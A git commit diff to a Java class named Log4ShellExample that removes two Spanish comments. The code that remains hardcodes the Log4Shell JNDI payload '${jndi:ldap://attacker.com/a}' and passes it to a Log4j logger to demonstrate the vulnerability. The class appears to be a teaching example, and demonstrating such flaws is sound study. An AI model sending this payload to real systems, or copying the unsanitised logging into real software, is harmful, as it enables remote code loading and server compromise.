d40f84aa03d219069937fc48527ecd82615e80ed
LM <130348667+Sotacero@users.noreply.github.com>
2024-12-16 12:01:55 +0100

    Update Example.java

--- Example.java
+++ Example.java
@@ -6,10 +6,9 @@ public class Log4ShellExample {
     private static final Logger logger = LogManager.getLogger(Log4ShellExample.class);
 
     public static void main(String[] args) {
-        // Simulación de entrada del usuario que podría ser manipulada
+        
         String userInput = "${jndi:ldap://attacker.com/a}";
         
-        // Registro de la entrada del usuario
         logger.error("User input: " + userInput);
         
         System.out.println("Log4Shell vulnerable example executed.");
